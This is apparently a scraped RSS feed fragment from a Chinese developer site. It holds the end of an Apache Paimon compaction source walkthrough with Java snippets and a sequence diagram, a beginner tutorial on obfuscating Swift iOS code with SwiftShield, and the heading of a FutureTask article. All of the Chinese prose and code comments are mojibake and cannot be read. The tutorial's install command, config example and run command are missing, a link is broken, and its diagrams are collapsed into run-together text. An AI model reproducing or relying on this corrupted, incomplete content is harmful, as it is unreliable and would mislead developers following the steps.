    <span class="hljs-built_in">this</span>.storeSinkWriteProvider = storeSinkWriteProvider;
    <span class="hljs-built_in">this</span>.initialCommitUser = initialCommitUser;
    <span class="hljs-built_in">this</span>.fullCompaction = fullCompaction;
}
</code></pre>
<h4 data-id="heading-9">(2) <code>processElement()</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processElement</span><span class="hljs-params">(StreamRecord&lt;RowData&gt; element)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-type">RowData</span> <span class="hljs-variable">record</span> <span class="hljs-operator">=</span> element.getValue();
    <span class="hljs-comment">// è§£ææ•°æ®</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">snapshotId</span> <span class="hljs-operator">=</span> record.getLong(<span class="hljs-number">0</span>); <span class="hljs-comment">// å¿«ç…§ID</span>
    <span class="hljs-type">BinaryRow</span> <span class="hljs-variable">partition</span> <span class="hljs-operator">=</span> deserializeBinaryRow(record.getBinary(<span class="hljs-number">1</span>)); <span class="hljs-comment">// åˆ†åŒºé”®</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">bucket</span> <span class="hljs-operator">=</span> record.getInt(<span class="hljs-number">2</span>); <span class="hljs-comment">// æ¡¶å·</span>
    <span class="hljs-type">byte</span>[] serializedFiles = record.getBinary(<span class="hljs-number">3</span>); <span class="hljs-comment">// åºåˆ—åŒ–çš„æ–‡ä»¶åˆ—è¡¨</span>
    List&lt;DataFileMeta&gt; files = dataFileMetaSerializer.deserializeList(serializedFiles);
    <span class="hljs-comment">// æµå¼æ¨¡å¼ï¼Œè°ƒnotifyNewFiles()é€šçŸ¥æ–°æ–‡ä»¶</span>
    <span class="hljs-keyword">if</span> (write.streamingMode()) {
        write.notifyNewFiles(snapshotId, partition, bucket, files);
    }
    <span class="hljs-comment">// æ‰¹é‡æ¨¡å¼ï¼Œæ£€æŸ¥æ–‡ä»¶æ˜¯å¦ä¸ºç©º</span>
    <span class="hljs-keyword">else</span> {
        Preconditions.checkArgument(
                files.isEmpty(),
                <span class="hljs-string">"Batch compact job does not concern what files are compacted. "</span>
                        + <span class="hljs-string">"They only need to know what buckets are compacted."</span>);
    }
    <span class="hljs-comment">// è®°å½•å¾…å‹ç¼©çš„ (partition, bucket)ï¼Œåç»­åœ¨prepareCommit()ä¸­ä¼šå‹ç¼©è¿™é‡Œçš„æ–‡ä»¶</span>
    waitToCompact.add(Pair.of(partition, bucket));
}
</code></pre>
<h4 data-id="heading-10">(3) <code>prepareCommit()</code> -- æ‰§è¡Œå‹ç¼©çš„å…¥å£</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> List&lt;Committable&gt; <span class="hljs-title function_">prepareCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> waitCompaction, <span class="hljs-type">long</span> checkpointId)</span>
        <span class="hljs-keyword">throws</span> IOException {

    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// éå†æ‰€æœ‰å¾…å‹ç¼©çš„&lt;partition, bucket&gt;ï¼Œè¿™é‡Œæœ€åä¼šè°ƒè¿™é‡Œçš„FileStoreWriteçš„å®ç°ç±»çš„compact()ï¼Œå¦‚AbstaracFileStoreWrite</span>
        <span class="hljs-keyword">for</span> (Pair&lt;BinaryRow, Integer&gt; partitionBucket : waitToCompact) {
            write.compact(partitionBucket.getKey(), partitionBucket.getRight(), fullCompaction);
        }
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Exception happens while executing compaction."</span>, e);
    }
    <span class="hljs-comment">// æ¸…ç©ºé›†åˆ</span>
    waitToCompact.clear();
    <span class="hljs-comment">// æ‰§è¡ŒStoreSinkWriteå®ç°ç±»çš„prepareCommit()</span>
    <span class="hljs-keyword">return</span> write.prepareCommit(waitCompaction, checkpointId);
}
</code></pre>
<h5 data-id="heading-11">&lt;1&gt; è°ƒç”¨çš„<code>StoreSinkWriteImpl.compact()</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compact</span><span class="hljs-params">(BinaryRow partition, <span class="hljs-type">int</span> bucket, <span class="hljs-type">boolean</span> fullCompaction)</span> <span class="hljs-keyword">throws</span> Exception {
    write.compact(partition, bucket, fullCompaction);
}
</code></pre>
<h5 data-id="heading-12">&lt;2&gt; è°ƒç”¨çš„<code>TableWriteImpl.compact()</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compact</span><span class="hljs-params">(BinaryRow partition, <span class="hljs-type">int</span> bucket, <span class="hljs-type">boolean</span> fullCompaction)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// è¿™é‡Œçš„writeæ˜¯FileStoreWriteçš„å®ç°ç±»ï¼Œå¦‚AbstractFileStoreWrite</span>
    write.compact(partition, bucket, fullCompaction);
}
</code></pre>
<h5 data-id="heading-13">&lt;3&gt; è°ƒç”¨çš„<code>AbstractFileStoreWrite.compact()</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compact</span><span class="hljs-params">(BinaryRow partition, <span class="hljs-type">int</span> bucket, <span class="hljs-type">boolean</span> fullCompaction)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// 1.å…ˆè°ƒgetWriterWrapper()è·å–å¯¹åº”partition-bucketçš„WriterContainer</span>
    <span class="hljs-comment">// 2.ç”¨å…¶ä¸­çš„MergeTreeWriterå®ç°ç±»çš„compactæ–¹æ³•è¿›è¡Œå‹ç¼©ï¼Œå¹¶ä¼ å…¥fullCompactionæ˜¯å¦éœ€è¦å…¨é‡å‹ç¼©</span>
    getWriterWrapper(partition, bucket).writer.compact(fullCompaction);
}
</code></pre>
<h5 data-id="heading-14">&lt;4&gt; è°ƒç”¨çš„<code>RecordWriterå®ç°ç±»MergeTreeRecordWriter.compact()</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compact</span><span class="hljs-params">(<span class="hljs-type">boolean</span> fullCompaction)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// è°ƒflushWriteBuffer(true, fullCompaction)</span>
    flushWriteBuffer(<span class="hljs-literal">true</span>, fullCompaction);
}
</code></pre>
<p>å‰©ä¸‹æµç¨‹è¯¦æƒ…çœ‹<a href="https://juejin.cn/post/7582872365522173990#heading-9" target="_blank" title="https://juejin.cn/post/7582872365522173990#heading-9">Paimonæºç è§£è¯» -- Compaction-7.FULL_COMPACTION_DELTA_COMMITS</a>å’Œ<a href="https://juejin.cn/post/7582872365522501670" target="_blank" title="https://juejin.cn/post/7582872365522501670">Paimonæºç è§£è¯» -- Compaction-4.KeyValueFileStoreWrite</a></p>
<h2 data-id="heading-15">ä¸‰.æ€»ç»“</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User as ç”¨æˆ· SQL
    participant CP as CompactProcedure
    participant PU as ParameterUtils
    participant CA as CompactAction
    participant CSB as CompactorSourceBuilder
    participant CBS as CompactorSinkBuilder
    participant CBT as CompactBucketsTable
    participant SCO as StoreCompactOperator
    participant SW as StoreSinkWrite
    participant MCM as MergeTreeCompactManager
    participant UC as UniversalCompaction
    
    User-&gt;&gt;CP: CALL sys.compact(...)
    
    Note over CP: æ­¥éª¤ 1: å‚æ•°è§£æ
    CP-&gt;&gt;PU: parseCommaSeparatedKeyValues('sink.parallelism=4')
    PU--&gt;&gt;CP: Map{"sink.parallelism": "4"}
    
    CP-&gt;&gt;PU: getPartitions(['p=0'])
    PU-&gt;&gt;PU: parseCommaSeparatedKeyValues('p=0')
    PU--&gt;&gt;CP: List[Map{"p": "0"}]
    
    Note over CP: æ­¥éª¤ 2: åˆ›å»º CompactAction
    CP-&gt;&gt;CA: new CompactAction(&lt;br/&gt;"default", "T",&lt;br/&gt;catalogOptions,&lt;br/&gt;tableConf)
    
    Note over CA: å…³é”®: å¼ºåˆ¶è®¾ç½® write-only=false
    CA-&gt;&gt;CA: dynamicOptions.put("write-only", "false")&lt;br/&gt;table = table.copy(dynamicOptions)
    
    Note over CP: æ­¥éª¤ 3: é…ç½®è¿‡æ»¤æ¡ä»¶
    CP-&gt;&gt;CA: withPartitions([{"p": "0"}])
    CP-&gt;&gt;CA: withWhereSql("dt&gt;10 and h&lt;20")
    
    Note over CP: æ­¥éª¤ 4: æ‰§è¡Œä»»åŠ¡
    CP-&gt;&gt;CA: run()
    CA-&gt;&gt;CA: build()
    
    Note over CA: æ­¥éª¤ 5: åˆ›å»º Source
    CA-&gt;&gt;CSB: new CompactorSourceBuilder(table)
    CSB-&gt;&gt;CBT: new CompactBucketsTable(table)
    
    Note over CBT: æ‰«æå…ƒæ•°æ®,&lt;br/&gt;ç”Ÿæˆéœ€è¦å‹ç¼©çš„&lt;br/&gt;(partition, bucket) åˆ—è¡¨
    
    CSB-&gt;&gt;CSB: withPartitionPredicate(p=0)
    CSB-&gt;&gt;CSB: build()
    CSB--&gt;&gt;CA: DataStreamSource&lt;RowData&gt;
    
    Note over CA: æ­¥éª¤ 6: åˆ›å»º Sink
    CA-&gt;&gt;CBS: new CompactorSinkBuilder(table, false)
    CBS-&gt;&gt;CBS: withInput(source)
    CBS-&gt;&gt;CBS: build()
    
    CBS-&gt;&gt;SCO: new StoreCompactOperator(...)
    Note over SCO: æ ¡éªŒ: write-only å¿…é¡»ä¸º false
    
    Note over CA: æ­¥éª¤ 7: æ‰§è¡Œ Flink Job
    CA-&gt;&gt;CA: execute("Compact job")
    
    loop æ¯æ¡å‹ç¼©ä»»åŠ¡è®°å½•
        SCO-&gt;&gt;SCO: processElement(record)
        Note over SCO: è®°å½•æ ¼å¼:&lt;br/&gt;(snapshotId, partition, bucket, files)
        
        SCO-&gt;&gt;SCO: è§£æ: partition=BinaryRow{p=0}&lt;br/&gt;bucket=0
        SCO-&gt;&gt;SCO: waitToCompact.add((partition, bucket))
    end
    
    Note over SCO: Checkpoint è§¦å‘
    SCO-&gt;&gt;SCO: prepareCommit(checkpointId)
    
    loop waitToCompact ä¸­çš„æ¯ä¸ª (partition, bucket)
        SCO-&gt;&gt;SW: compact(partition=p0, bucket=0, fullCompaction=false)
        SW-&gt;&gt;MCM: triggerCompaction(false)
        
        MCM-&gt;&gt;UC: pick(numLevels, runs)
        Note over UC: åº”ç”¨å‹ç¼©ç­–ç•¥:&lt;br/&gt;1. æ—¶é—´é—´éš”æ£€æŸ¥&lt;br/&gt;2. ç©ºé—´æ”¾å¤§æ£€æŸ¥&lt;br/&gt;3. å¤§å°æ¯”ç‡æ£€æŸ¥&lt;br/&gt;4. æ–‡ä»¶æ•°é‡æ£€æŸ¥
        
        UC--&gt;&gt;MCM: CompactUnit
        MCM-&gt;&gt;MCM: submitCompaction(unit)
        Note over MCM: å¼‚æ­¥æ‰§è¡Œå‹ç¼©ä»»åŠ¡
        
        MCM--&gt;&gt;SW: CompactResult
        SW--&gt;&gt;SCO: List&lt;Committable&gt;
    end
    
    SCO-&gt;&gt;SCO: æäº¤ Committable
    SCO--&gt;&gt;User: å‹ç¼©å®Œæˆ

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è¯¦ç»†æ•™ç¨‹ï¼šiOSåº”ç”¨ä¸­Swiftä»£ç æ··æ·†æ­¥éª¤ä¸å·¥å…·æ¨è]]></title>    <link>https://juejin.cn/post/7583913535270453258</link>    <guid>https://juejin.cn/post/7583913535270453258</guid>    <pubDate>2025-12-15T10:01:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583913535270453258" data-draft-id="7583707681003618350" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è¯¦ç»†æ•™ç¨‹ï¼šiOSåº”ç”¨ä¸­Swiftä»£ç æ··æ·†æ­¥éª¤ä¸å·¥å…·æ¨è"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-15T10:01:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="bcbnb"/> <meta itemprop="url" content="https://juejin.cn/user/895474073078377"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è¯¦ç»†æ•™ç¨‹ï¼šiOSåº”ç”¨ä¸­Swiftä»£ç æ··æ·†æ­¥éª¤ä¸å·¥å…·æ¨è
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/895474073078377/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    bcbnb
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:01:30.000Z" title="Mon Dec 15 2025 10:01:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">iOS å¯¹ Swift ä»£ç è¿›è¡Œæ··æ·†çš„æµç¨‹æŒ‡å—</h2>
<p>åœ¨å½“ä»Šçš„è½¯ä»¶å¼€å‘ç¯å¢ƒä¸­ï¼Œä»£ç æ··æ·†æ˜¯ä¸€ç§ä¿æŠ¤æºä»£ç çš„æœ‰æ•ˆæ‰‹æ®µï¼Œç‰¹åˆ«æ˜¯åœ¨ç§»åŠ¨åº”ç”¨å¼€å‘ä¸­ã€‚æ··æ·†å¯ä»¥åŠ å¤§é€†å‘å·¥ç¨‹çš„éš¾åº¦ï¼Œä»è€Œä¿æŠ¤ä½ çš„çŸ¥è¯†äº§æƒã€‚æœ¬æ–‡å°†ä¸ºåˆšå…¥è¡Œçš„å°ç™½æä¾›ä¸€ä¸ªå…³äºå¦‚ä½•åœ¨ iOS åº”ç”¨ä¸­å¯¹ Swift ä»£ç è¿›è¡Œæ··æ·†çš„è¯¦ç»†æ­¥éª¤æŒ‡å—ã€‚</p>
<h3 data-id="heading-1">æµç¨‹æ¦‚è§ˆ</h3>
<p>ä¸‹é¢æ˜¯å®ç°ä»£ç æ··æ·†çš„ä¸»è¦æ­¥éª¤ï¼š</p>
<p>æ­¥éª¤è¯´æ˜1å‡†å¤‡å·¥ä½œï¼šè®¾ç½® Xcodeé¡¹ç›®2å®‰è£…æ··æ·†å·¥å…·ï¼ˆå¦‚ SwiftShieldï¼‰3é…ç½®æ··æ·†å·¥å…·çš„è®¾ç½®4æ‰§è¡Œæ··æ·†5éªŒè¯æ··æ·†åçš„ä»£ç </p>
<p><strong>åºåˆ—å›¾</strong></p>
<p>æ··æ·†å·¥å…·Xcodeå¼€å‘è€…æ··æ·†å·¥å…·Xcodeå¼€å‘è€…è®¾ç½®Xcodeé¡¹ç›®å®‰è£…æ··æ·†å·¥å…·æä¾›é…ç½®æ–‡ä»¶é…ç½®æ··æ·†å·¥å…·æ‰§è¡Œæ··æ·†è¿”å›æ··æ·†åçš„ä»£ç éªŒè¯æ··æ·†ç»“æœ</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†è¯¦ç»†æè¿°æ¯ä¸€ä¸ªæ­¥éª¤ï¼Œå¹¶æä¾›éœ€è¦ç”¨åˆ°çš„ä»£ç ç¤ºä¾‹ã€‚</p>
<h3 data-id="heading-2">æ­¥éª¤è¯¦è§£</h3>
<h4 data-id="heading-3">ç¬¬ä¸€æ­¥ï¼šå‡†å¤‡å·¥ä½œ</h4>
<p>åœ¨è®¾ç½® Xcode é¡¹ç›®ä¹‹å‰ï¼Œè¯·ç¡®ä¿ä½ æœ‰ä¸€ä¸ªå·²åˆ›å»ºçš„ iOS é¡¹ç›®ã€‚å¦‚æœè¿˜æ²¡æœ‰ï¼Œå¯ä»¥é€šè¿‡ä¸‹åˆ—æ­¥éª¤æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®ï¼š</p>
<ol>
<li>æ‰“å¼€ Xcodeï¼Œé€‰æ‹© <code>File</code> -&gt; <code>New</code> -&gt; <code>Project</code>ã€‚</li>
<li>é€‰æ‹© <code>App</code>ï¼Œç„¶åç‚¹å‡» <code>Next</code>ã€‚</li>
<li>å¡«å†™é¡¹ç›®çš„åŸºæœ¬ä¿¡æ¯ï¼Œç„¶åç‚¹å‡» <code>Create</code>ã€‚</li>
</ol>
<h4 data-id="heading-4">ç¬¬äºŒæ­¥ï¼šå®‰è£…æ··æ·†å·¥å…·</h4>
<p>è¿™é‡Œæˆ‘ä»¬å°†ä½¿ç”¨ [SwiftShield]( ä½œä¸ºæ··æ·†å·¥å…·ã€‚å®‰è£…æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>æ‰“å¼€ç»ˆç«¯ã€‚</li>
<li>è¿è¡Œä»¥ä¸‹å‘½ä»¤ä»¥ä½¿ç”¨ Homebrew å®‰è£… SwiftShieldï¼š</li>
</ol>
<p>é™¤äº†SwiftShieldï¼Œå¼€å‘è€…ä¹Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨IpaGuardï¼Œå®ƒæ˜¯ä¸€æ¬¾å¼ºå¤§çš„iOS IPAæ–‡ä»¶æ··æ·†å·¥å…·ï¼Œæ— éœ€æºç å³å¯å¯¹ä»£ç å’Œèµ„æºè¿›è¡Œæ··æ·†åŠ å¯†ï¼Œæ”¯æŒå¤šç§å¼€å‘å¹³å°ï¼Œæœ‰æ•ˆå¢åŠ åç¼–è¯‘éš¾åº¦ã€‚</p>
<h4 data-id="heading-5">ç¬¬ä¸‰æ­¥ï¼šé…ç½®æ··æ·†å·¥å…·çš„è®¾ç½®</h4>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º <code>swiftshield.yml</code> çš„é…ç½®æ–‡ä»¶ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<p><strong>æ³¨é‡Šï¼š</strong> ä¸Šè¿°é…ç½®æ–‡ä»¶æŒ‡å®šäº†è¦æ··æ·†çš„ç›®æ ‡ç±»åŠå…¶æ–°çš„åç§°ï¼ŒåŒæ—¶æ’é™¤äº†æµ‹è¯•ç›®å½•ï¼Œä»¥é¿å…æ··æ·†æµ‹è¯•ä»£ç ã€‚</p>
<h4 data-id="heading-6">ç¬¬å››æ­¥ï¼šæ‰§è¡Œæ··æ·†</h4>
<p>åœ¨ç»ˆç«¯ä¸­å¯¼èˆªåˆ°ä½ çš„é¡¹ç›®æ ¹ç›®å½•ï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥è¿›è¡Œæ··æ·†ï¼š</p>
<p>è¯¥å‘½ä»¤å°†è¯»å– <code>swiftshield.yml</code> æ–‡ä»¶å¹¶åº”ç”¨æ··æ·†é…ç½®ã€‚</p>
<h4 data-id="heading-7">ç¬¬äº”æ­¥ï¼šéªŒè¯æ··æ·†åçš„ä»£ç </h4>
<p>æ··æ·†å®Œæˆåï¼Œå»ºè®®éªŒè¯æ··æ·†ç»“æœã€‚ä½ å¯ä»¥åœ¨ Xcode ä¸­æ‰“å¼€ç”Ÿæˆçš„ä»£ç æ–‡ä»¶ï¼ŒæŸ¥çœ‹ç±»å’Œæ–¹æ³•åç§°æ˜¯å¦å·²ç»æ”¹å˜ã€‚</p>
<p><strong>æ—…è¡Œå›¾</strong></p>
<p>iOSä»£ç æ··æ·†è¿‡ç¨‹ä¸‹è½½å®Œæˆä¿å­˜åˆ›å»ºæˆåŠŸæˆåŠŸæ‰§è¡Œå®Œæˆæ ¼å¼æ­£ç¡®ç»“æœè¿”å›è§£å‹ã€å®‰è£…æˆåŠŸéªŒè¯æˆåŠŸå®‰è£…å·¥å…·è§£å‹ã€å®‰è£…æˆåŠŸå®‰è£…Homebrewä¸‹è½½å®ŒæˆæˆåŠŸå®‰è£…SwiftShieldé…ç½®æ–‡ä»¶åˆ›å»ºæˆåŠŸåˆ›å»ºswiftshield.ymlæ–‡ä»¶æ ¼å¼æ­£ç¡®ä¿å­˜å†™å…¥æ··æ·†è§„åˆ™æ‰§è¡Œæ··æ·†æ‰§è¡Œå®Œæˆç»“æœè¿”å›è¿è¡Œå‘½ä»¤éªŒè¯ç»“æœéªŒè¯æˆåŠŸæ‰“å¼€XcodeæŸ¥çœ‹iOSä»£ç æ··æ·†è¿‡ç¨‹</p>
<h3 data-id="heading-8">ç»“å°¾</h3>
<p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œä½ åº”è¯¥èƒ½å¤ŸæˆåŠŸåœ°åœ¨ä½ çš„ iOS é¡¹ç›®ä¸­å¯¹ Swift ä»£ç è¿›è¡Œæ··æ·†ã€‚æ··æ·†ä¸ä»…èƒ½å¸®åŠ©ä¿æŠ¤ä½ çš„ä»£ç ï¼Œè¿˜èƒ½å¢å¼ºä½ åº”ç”¨çš„å®‰å…¨æ€§ã€‚åœ¨è¿›è¡Œæ··æ·†æ—¶ï¼Œè¯·è®°å¾—å®šæœŸå¤‡ä»½ä½ çš„ä»£ç ï¼Œä»¥é˜²æ„å¤–æƒ…å†µå‘ç”Ÿã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©åˆ°ä½ ï¼Œå¦‚æœ‰å…¶ä»–é—®é¢˜ï¼Œè¯·éšæ—¶å‘æˆ‘æé—®ï¼ç¥ coding æ„‰å¿«ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[FutureTaskæºç åˆ†æ]]></title>    <link>https://juejin.cn/post/7583699786433593384</link>    <guid>https://juejin.cn/post/7583699786433593384</guid>    <pubDate>2025-12-15T09:42:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583699786433593384" data-draft-id="7583892482598191119" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="FutureTaskæºç åˆ†æ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-15T09:42:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¢¨å®ˆåŸè§„"/> <meta itemprop="url" content="https://juejin.cn/user/501817459614766"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            FutureTaskæºç åˆ†æ
